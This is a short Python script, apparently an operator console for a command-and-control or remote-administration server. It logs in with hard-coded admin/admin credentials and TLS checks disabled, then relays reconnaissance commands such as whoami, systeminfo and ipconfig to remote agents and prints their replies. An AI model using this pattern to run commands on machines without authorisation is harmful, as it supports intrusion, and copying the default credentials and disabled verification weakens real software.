import requests
import urllib3
import sys
import json
import threading
import time

proxies = {
	'http' : 'http://127.0.0.1:8080',
	'https' : 'http://127.0.0.1:8080'
}
creds = {
	'username' : 'admin',
	'password' : 'admin'
}

URL = "https://127.0.0.1:8443"

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

cmd_permitidos = ["whoami", "systeminfo", "ipconfig", "hostname", "dir", "ayuda", "salir"]
cmd_ayuda = ["Comando de SO", "Comando de SO", "Comando de SO", "Comando de SO", "Comando de SO", "Muestra este mensaje de ayuda", "Termina la sesion."]


def ayuda():
	print("Comandos permitido")
	for (comando, ayuda) in zip(cmd_permitidos, cmd_ayuda):
		print("\t{}\t{}".format(comando, ayuda))

try:
	client_id = int(sys.argv[1])
	tipo = sys.argv[2]
	a = "{}:{}".format(client_id,tipo)
	with requests.Session() as remoto:
		#remoto.proxies = proxies
		remoto.verify = False
		com = remoto.get(URL)
		com = remoto.post(URL+"/login", data=creds)
		print("Sesion interactiva iniciada [{}]".format(client_id))
		while True:
			cmd = input("cmd> ").lower()
			if cmd in cmd_permitidos:
				if cmd == cmd_permitidos[5]:
					ayuda()
				elif cmd == cmd_permitidos[6]:
					print("Adios!")
					remoto.post(URL+"/api/cmd", data={"clients" : a, "command" : "close"})
					break
				else:
					params = {"clients" : a, "command" : cmd}
					com = remoto.post(URL+"/api/cmd", data=params)
					time.sleep(4)
					com = remoto.get(URL+"/api/log")
					json_data = com.text
					json_respuesta = json.loads(json_data)
					if len(json_respuesta[0]['Response']) > 0 :
						print("{}:\n{}".format(json_respuesta[0]['Agent'], json_respuesta[0]['Response']))
					else:
						time.sleep(4)
						com = remoto.get(URL+"/api/log")
						json_data = com.text
						json_respuesta = json.loads(json_data)
						if len(json_respuesta[0]['Response']) == 0 :
							print("{}: Error, intenta de nuevo.".format(json_respuesta[0]['Agent']))
						else:
							print("{}:\n{}".format(json_respuesta[0]['Agent'], json_respuesta[0]['Response']))
			else:
				print("Comando no reconocido!")

except Exception as e:
	raise e